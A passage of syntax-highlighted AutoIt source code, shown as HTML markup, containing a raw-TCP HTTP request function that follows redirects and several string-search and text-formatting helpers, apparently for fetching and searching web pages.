 </span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$sHTTPMethod</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">"GET"</span><span class="sc0">
 </span><span class="sc5">If</span><span class="sc0"> </span><span class="sc4">StringInStr</span><span class="sc8">(</span><span class="sc9">$sResource</span><span class="sc8">,</span><span class="sc7">"#"</span><span class="sc8">)&gt;</span><span class="sc3">0</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0">
    </span><span class="sc9">$sHTTPMethod</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">Stringright</span><span class="sc8">(</span><span class="sc9">$sResource</span><span class="sc8">,</span><span class="sc4">Stringlen</span><span class="sc8">(</span><span class="sc9">$sResource</span><span class="sc8">)-</span><span class="sc4">StringInStr</span><span class="sc8">(</span><span class="sc9">$sResource</span><span class="sc8">,</span><span class="sc7">"#"</span><span class="sc8">)-</span><span class="sc3">2</span><span class="sc8">)</span><span class="sc0">
    </span><span class="sc9">$sResource</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">Stringleft</span><span class="sc8">(</span><span class="sc9">$sResource</span><span class="sc8">,</span><span class="sc4">StringInStr</span><span class="sc8">(</span><span class="sc9">$sResource</span><span class="sc8">,</span><span class="sc7">"#"</span><span class="sc8">)-</span><span class="sc3">1</span><span class="sc8">)</span><span class="sc0">
 </span><span class="sc5">EndIf</span><span class="sc0">
 </span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$size</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> InetGetSize</span><span class="sc8">(</span><span class="sc9">$sResource</span><span class="sc8">)</span><span class="sc0">
 </span><span class="sc5">If</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc9">$size</span><span class="sc0"> </span><span class="sc8">&gt;</span><span class="sc0"> </span><span class="sc3">512000</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0"> </span><span class="sc5">Return</span><span class="sc8">(</span><span class="sc7">""</span><span class="sc8">)</span><span class="sc0">
 </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc9">$size</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc3">0</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> </span><span class="sc9">$size</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc3">512000</span><span class="sc0">
 </span><span class="sc9">$url_parts</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">StringSplit</span><span class="sc8">(</span><span class="sc9">$sResource</span><span class="sc8">,</span><span class="sc7">"/"</span><span class="sc8">)</span><span class="sc0">
 </span><span class="sc9">$sServer</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc9">$url_parts</span><span class="sc8">[</span><span class="sc3">3</span><span class="sc8">]</span><span class="sc0">
 </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc4">StringInStr</span><span class="sc8">(</span><span class="sc9">$sServer</span><span class="sc8">,</span><span class="sc7">":"</span><span class="sc8">)&gt;</span><span class="sc3">0</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0">
     </span><span class="sc9">$nPort</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">Int</span><span class="sc8">(</span><span class="sc4">StringMid</span><span class="sc8">(</span><span class="sc9">$sServer</span><span class="sc8">,</span><span class="sc4">StringInStr</span><span class="sc8">(</span><span class="sc9">$sServer</span><span class="sc8">,</span><span class="sc7">":"</span><span class="sc8">)+</span><span class="sc3">1</span><span class="sc8">))</span><span class="sc0">
     </span><span class="sc9">$sServer</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">Stringleft</span><span class="sc8">(</span><span class="sc9">$sServer</span><span class="sc8">,</span><span class="sc0">IndexOf</span><span class="sc8">(</span><span class="sc9">$sServer</span><span class="sc8">,</span><span class="sc7">":"</span><span class="sc8">,</span><span class="sc0">false</span><span class="sc8">))</span><span class="sc0">
 </span><span class="sc5">EndIf</span><span class="sc0">
 </span><span class="sc9">$url_parts</span><span class="sc8">[</span><span class="sc3">1</span><span class="sc8">]</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">""</span><span class="sc0">
 </span><span class="sc9">$url_parts</span><span class="sc8">[</span><span class="sc3">3</span><span class="sc8">]</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">""</span><span class="sc0">
 </span><span class="sc9">$sResource</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> join</span><span class="sc8">(</span><span class="sc9">$url_parts</span><span class="sc8">,</span><span class="sc7">"/"</span><span class="sc8">)</span><span class="sc0">
 </span><span class="sc9">$sResource</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> FormatURL</span><span class="sc8">(</span><span class="sc9">$sResource</span><span class="sc8">)</span><span class="sc0">
 </span><span class="sc9">$s</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> TCPConnect</span><span class="sc8">(</span><span class="sc0">TCPNameToIp</span><span class="sc8">(</span><span class="sc9">$sServer</span><span class="sc8">),</span><span class="sc9">$nPort</span><span class="sc8">)</span><span class="sc0">
 </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc6">@error</span><span class="sc0"> </span><span class="sc5">Or</span><span class="sc0"> </span><span class="sc9">$s</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc8">-</span><span class="sc3">1</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> </span><span class="sc5">Return</span><span class="sc8">(</span><span class="sc7">""</span><span class="sc8">)</span><span class="sc0">
 </span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$sp</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc9">$sServer</span><span class="sc0">
 </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc9">$nPort</span><span class="sc0"> </span><span class="sc8">&lt;&gt;</span><span class="sc0"> </span><span class="sc3">80</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> </span><span class="sc9">$sp</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc9">$sp</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc7">":"</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc9">$nPort</span><span class="sc0">
 </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc9">$sHTTPMethod</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">"GET"</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0">
  </span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$query</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc9">$sHTTPMethod</span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc7">" /"</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc9">$sResource</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc7">" HTTP/1.0"</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc6">@crlf</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc7">"Host: "</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc9">$sp</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc6">@crlf</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc6">@crlf</span><span class="sc0">
 </span><span class="sc5">Else</span><span class="sc0">
  </span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$newparams</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">Stringmid</span><span class="sc8">(</span><span class="sc9">$sResource</span><span class="sc8">,</span><span class="sc4">Stringinstr</span><span class="sc8">(</span><span class="sc9">$sResource</span><span class="sc8">,</span><span class="sc7">"?"</span><span class="sc8">)+</span><span class="sc3">1</span><span class="sc8">)</span><span class="sc0">
  </span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$query</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc9">$sHTTPMethod</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc7">" /"</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc4">stringleft</span><span class="sc8">(</span><span class="sc9">$sResource</span><span class="sc8">,</span><span class="sc4">stringinstr</span><span class="sc8">(</span><span class="sc9">$sResource</span><span class="sc8">,</span><span class="sc7">"?"</span><span class="sc8">)-</span><span class="sc3">1</span><span class="sc8">)</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc7">" HTTP/1.0"</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc6">@crlf</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc7">"Host: "</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc9">$sp</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc6">@crlf</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc7">"Content-Type: application/x-www-form-urlencoded"</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc6">@crlf</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc7">"Content-length: "</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc4">stringlen</span><span class="sc8">(</span><span class="sc9">$newparams</span><span class="sc8">)</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc6">@crlf</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc6">@crlf</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc9">$newparams</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc6">@crlf</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc6">@crlf</span><span class="sc0">
 </span><span class="sc5">EndIf</span><span class="sc0">
 TCPSend</span><span class="sc8">(</span><span class="sc9">$s</span><span class="sc8">,</span><span class="sc9">$query</span><span class="sc8">)</span><span class="sc0">
 </span><span class="sc5">If</span><span class="sc0"> </span><span class="sc6">@error</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0"> </span><span class="sc5">Return</span><span class="sc8">(</span><span class="sc7">""</span><span class="sc8">)</span><span class="sc0">
 </span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$ret</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">""</span><span class="sc0">
 </span><span class="sc5">While</span><span class="sc0"> true
  </span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$tmpret</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> TCPRecv</span><span class="sc8">(</span><span class="sc9">$s</span><span class="sc8">,</span><span class="sc3">2048</span><span class="sc8">)</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc6">@error</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0"> </span><span class="sc5">ExitLoop</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc9">$tmpret</span><span class="sc0"> </span><span class="sc8">&lt;&gt;</span><span class="sc0"> </span><span class="sc7">""</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> 
      </span><span class="sc9">$ret</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc9">$ret</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc9">$tmpret</span><span class="sc0">
  </span><span class="sc5">endif</span><span class="sc0">
</span><span class="sc5">WEnd</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc4">StringInStr</span><span class="sc8">(</span><span class="sc9">$ret</span><span class="sc8">,</span><span class="sc7">"HTTP/1.1 200"</span><span class="sc8">)=</span><span class="sc3">0</span><span class="sc0"> </span><span class="sc5">and</span><span class="sc0"> </span><span class="sc4">StringInStr</span><span class="sc8">(</span><span class="sc9">$ret</span><span class="sc8">,</span><span class="sc7">"HTTP/1.0 200"</span><span class="sc8">)=</span><span class="sc3">0</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0">
 </span><span class="sc9">$loc_ndx</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">StringInStr</span><span class="sc8">(</span><span class="sc4">stringlower</span><span class="sc8">(</span><span class="sc9">$ret</span><span class="sc8">),</span><span class="sc7">"location: "</span><span class="sc8">)</span><span class="sc0">
 </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc9">$loc_ndx</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc3">0</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> </span><span class="sc5">Return</span><span class="sc8">(</span><span class="sc7">""</span><span class="sc8">)</span><span class="sc0">
 </span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$lines</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">StringSplit</span><span class="sc8">(</span><span class="sc9">$ret</span><span class="sc8">,</span><span class="sc6">@crlf</span><span class="sc8">)</span><span class="sc0">
 </span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$new_loc</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">""</span><span class="sc0">
 </span><span class="sc5">For</span><span class="sc0"> </span><span class="sc9">$j</span><span class="sc8">=</span><span class="sc3">1</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc9">$lines</span><span class="sc8">[</span><span class="sc3">0</span><span class="sc8">]</span><span class="sc0">
     </span><span class="sc5">If</span><span class="sc0"> </span><span class="sc4">stringlower</span><span class="sc8">(</span><span class="sc4">stringleft</span><span class="sc8">(</span><span class="sc9">$lines</span><span class="sc8">[</span><span class="sc9">$j</span><span class="sc8">],</span><span class="sc3">10</span><span class="sc8">))</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">"location: "</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0">
         </span><span class="sc9">$new_loc</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">StringMid</span><span class="sc8">(</span><span class="sc9">$lines</span><span class="sc8">[</span><span class="sc9">$j</span><span class="sc8">],</span><span class="sc3">11</span><span class="sc8">)</span><span class="sc0">
         </span><span class="sc5">ExitLoop</span><span class="sc0">
     </span><span class="sc5">EndIf</span><span class="sc0">
 </span><span class="sc5">Next</span><span class="sc0">
 </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc4">stringlen</span><span class="sc8">(</span><span class="sc9">$new_loc</span><span class="sc8">)&gt;</span><span class="sc3">0</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0">
     </span><span class="sc9">$ret</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> HTTPRequest</span><span class="sc8">(</span><span class="sc9">$new_loc</span><span class="sc8">)</span><span class="sc0">
 </span><span class="sc5">Else</span><span class="sc0">
     </span><span class="sc9">$ret</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">""</span><span class="sc0">
 </span><span class="sc5">EndIf</span><span class="sc0">
</span><span class="sc5">EndIf</span><span class="sc0">
</span><span class="sc5">Return</span><span class="sc8">(</span><span class="sc9">$ret</span><span class="sc8">)</span><span class="sc0">
</span><span class="sc5">EndFunc</span><span class="sc0">

</span><span class="sc5">Func</span><span class="sc0"> IsAnHTTPService</span><span class="sc8">(</span><span class="sc9">$sService</span><span class="sc8">)</span><span class="sc1">;checks if the resource is pointing to an http protocol or not</span><span class="sc0">
 </span><span class="sc9">$sService</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> FormatURL</span><span class="sc8">(</span><span class="sc9">$sService</span><span class="sc8">)</span><span class="sc0">
 </span><span class="sc9">$sServiceType</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">StringLower</span><span class="sc8">(</span><span class="sc4">Stringleft</span><span class="sc8">(</span><span class="sc9">$sService</span><span class="sc8">,</span><span class="sc0"> </span><span class="sc4">Stringlen</span><span class="sc8">(</span><span class="sc7">"http"</span><span class="sc8">)))</span><span class="sc0">
 </span><span class="sc5">Return</span><span class="sc8">(</span><span class="sc9">$sServiceType</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">"http"</span><span class="sc8">)</span><span class="sc0">
</span><span class="sc5">EndFunc</span><span class="sc0">

</span><span class="sc5">Func</span><span class="sc0"> Strip</span><span class="sc8">(</span><span class="sc9">$InLine</span><span class="sc8">,</span><span class="sc9">$flag_char1</span><span class="sc8">,</span><span class="sc9">$flag_char2</span><span class="sc8">)</span><span class="sc1">;removes all chars between the given two (and them too) from the given string</span><span class="sc0">
</span><span class="sc9">$bWrite</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> true
</span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$sResult</span><span class="sc0">
</span><span class="sc5">for</span><span class="sc0"> </span><span class="sc9">$n</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc3">0</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc4">Stringlen</span><span class="sc8">(</span><span class="sc9">$InLine</span><span class="sc8">)</span><span class="sc0">
 </span><span class="sc9">$char</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">""</span><span class="sc0">
 </span><span class="sc9">$char</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">Stringright</span><span class="sc8">(</span><span class="sc4">Stringleft</span><span class="sc8">(</span><span class="sc9">$InLine</span><span class="sc8">,</span><span class="sc9">$n</span><span class="sc8">),</span><span class="sc3">1</span><span class="sc8">)</span><span class="sc0">
 </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc9">$char</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc9">$flag_char1</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0">
  </span><span class="sc9">$bWrite</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> False
 </span><span class="sc5">elseif</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc9">$char</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc9">$flag_char2</span><span class="sc0"> </span><span class="sc5">Or</span><span class="sc0"> </span><span class="sc9">$char</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc6">@lf</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0">
  </span><span class="sc9">$bWrite</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> True
  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc9">$char</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc6">@lf</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> </span><span class="sc9">$sResult</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc9">$sResult</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc6">@lf</span><span class="sc0">
 </span><span class="sc5">elseif</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc9">$bWrite</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0">
  </span><span class="sc9">$sResult</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc9">$sResult</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc9">$char</span><span class="sc0">
 </span><span class="sc5">endif</span><span class="sc0">
</span><span class="sc5">next</span><span class="sc0">
</span><span class="sc5">Return</span><span class="sc8">(</span><span class="sc9">$sResult</span><span class="sc8">)</span><span class="sc0">
</span><span class="sc5">EndFunc</span><span class="sc0">

</span><span class="sc5">Func</span><span class="sc0"> LastIndexOf</span><span class="sc8">(</span><span class="sc9">$str</span><span class="sc8">,</span><span class="sc9">$chars</span><span class="sc8">,</span><span class="sc0"> </span><span class="sc9">$bCheckCase</span><span class="sc8">)</span><span class="sc0">
 </span><span class="sc9">$index</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc8">-</span><span class="sc3">1</span><span class="sc0">
 </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc5">not</span><span class="sc0"> </span><span class="sc9">$bCheckCase</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> </span><span class="sc9">$chars</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">StringLower</span><span class="sc8">(</span><span class="sc9">$chars</span><span class="sc8">)</span><span class="sc0">
 </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc9">$ndx</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc3">0</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc4">Stringlen</span><span class="sc8">(</span><span class="sc9">$str</span><span class="sc8">)</span><span class="sc0">
  </span><span class="sc9">$c</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">Stringright</span><span class="sc8">(</span><span class="sc4">Stringleft</span><span class="sc8">(</span><span class="sc9">$str</span><span class="sc8">,</span><span class="sc9">$ndx</span><span class="sc8">),</span><span class="sc4">Stringlen</span><span class="sc8">(</span><span class="sc9">$chars</span><span class="sc8">))</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc5">not</span><span class="sc0"> </span><span class="sc9">$bCheckCase</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> </span><span class="sc9">$c</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">StringLower</span><span class="sc8">(</span><span class="sc9">$c</span><span class="sc8">)</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc4">Stringlen</span><span class="sc8">(</span><span class="sc9">$c</span><span class="sc8">)</span><span class="sc0"> </span><span class="sc8">&gt;</span><span class="sc0"> </span><span class="sc3">0</span><span class="sc0"> </span><span class="sc5">and</span><span class="sc0"> </span><span class="sc9">$c</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc9">$chars</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> </span><span class="sc9">$index</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc9">$ndx</span><span class="sc0"> </span><span class="sc8">-</span><span class="sc0"> </span><span class="sc4">Stringlen</span><span class="sc8">(</span><span class="sc9">$chars</span><span class="sc8">)</span><span class="sc0">
 </span><span class="sc5">next</span><span class="sc0">
 </span><span class="sc5">Return</span><span class="sc8">(</span><span class="sc9">$index</span><span class="sc8">)</span><span class="sc0">
</span><span class="sc5">EndFunc</span><span class="sc0">

</span><span class="sc5">Func</span><span class="sc0"> IndexOf</span><span class="sc8">(</span><span class="sc9">$str</span><span class="sc8">,</span><span class="sc9">$chars</span><span class="sc8">,</span><span class="sc9">$bCheckCase</span><span class="sc8">)</span><span class="sc1">;same as stringinstr but returns 1 less</span><span class="sc0">
 </span><span class="sc9">$index</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc8">-</span><span class="sc3">1</span><span class="sc0">
 </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc5">not</span><span class="sc0"> </span><span class="sc9">$bCheckCase</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> </span><span class="sc9">$chars</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">StringLower</span><span class="sc8">(</span><span class="sc9">$chars</span><span class="sc8">)</span><span class="sc0">
 </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc9">$ndx</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc3">0</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc4">Stringlen</span><span class="sc8">(</span><span class="sc9">$str</span><span class="sc8">)</span><span class="sc0">
  </span><span class="sc9">$c</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">Stringright</span><span class="sc8">(</span><span class="sc4">Stringleft</span><span class="sc8">(</span><span class="sc9">$str</span><span class="sc8">,</span><span class="sc9">$ndx</span><span class="sc8">),</span><span class="sc4">Stringlen</span><span class="sc8">(</span><span class="sc9">$chars</span><span class="sc8">))</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc5">not</span><span class="sc0"> </span><span class="sc9">$bCheckCase</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> </span><span class="sc9">$c</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">StringLower</span><span class="sc8">(</span><span class="sc9">$c</span><span class="sc8">)</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc9">$c</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc9">$chars</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> 
   </span><span class="sc9">$index</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc9">$ndx</span><span class="sc0"> </span><span class="sc8">-</span><span class="sc0"> </span><span class="sc4">Stringlen</span><span class="sc8">(</span><span class="sc9">$chars</span><span class="sc8">)</span><span class="sc0">
   </span><span class="sc5">ExitLoop</span><span class="sc0">
  </span><span class="sc5">endif</span><span class="sc0">
 </span><span class="sc5">next</span><span class="sc0">
 </span><span class="sc5">Return</span><span class="sc8">(</span><span class="sc9">$index</span><span class="sc8">)</span><span class="sc0">
</span><span class="sc5">EndFunc</span><span class="sc0">

</span><span class="sc5">Func</span><span class="sc0"> FormatText</span><span class="sc8">(</span><span class="sc9">$sText</span><span class="sc8">)</span><span class="sc1">;formats our text to be better searched</span><span class="sc0">
 </span><span class="sc9">$sText</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">StringMid</span><span class="sc8">(</span><span class="sc9">$sText</span><span class="sc8">,</span><span class="sc0">IndexOf</span><span class="sc8">(</span><span class="sc9">$sText</span><span class="sc8">,</span><span class="sc7">"&lt;"</span><span class="sc8">,</span><span class="sc0">false</span><span class="sc8">))</span><span class="sc0">
 </span><span class="sc9">$sText</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">Stringreplace</span><span class="sc8">(</span><span class="sc9">$sText</span><span class="sc8">,</span><span class="sc6">@Crlf</span><span class="sc8">,</span><span class="sc7">""</span><span class="sc8">)</span><span class="sc0">
 </span><span class="sc9">$sText</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">Stringreplace</span><span class="sc8">(</span><span class="sc9">$sText</span><span class="sc8">,</span><span class="sc4">chr</span><span class="sc8">(</span><span class="sc3">13</span><span class="sc8">),</span><span class="sc7">""</span><span class="sc8">)</span><span class="sc0">
 </span><span class="sc9">$sText</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">Stringreplace</span><span class="sc8">(</span><span class="sc9">$sText</span><span class="sc8">,</span><span class="sc4">chr</span><span class="sc8">(</span><span class="sc3">10</span><span class="sc8">),</span><span class="sc7">""</span><span class="sc8">)</span><span class="sc0">
 </span><span class="sc9">$sText</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">Stringreplace</span><span class="sc8">(</span><span class="sc9">$sText</span><span class="sc8">,</span><span class="sc7">"&lt;"</span><span class="sc8">,</span><span class="sc6">@lf</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc7">"&lt;"</span><span class="sc8">)</span><span class="sc0">
 </span><span class="sc5">Return</span><span class="sc8">(</span><span class="sc9">$sText</span><span class="sc8">)</span><span class="sc0">
</span><span class="sc5">EndFunc</span><span class="sc0">

</span><span class="sc5">Func</span><span class="sc0"> FormatURL</span><span class="sc8">(</span><span class="sc9">$sURL</span><span class="sc8">)</span><span class="sc1">;formats correctly the given url</span><span class="sc0">
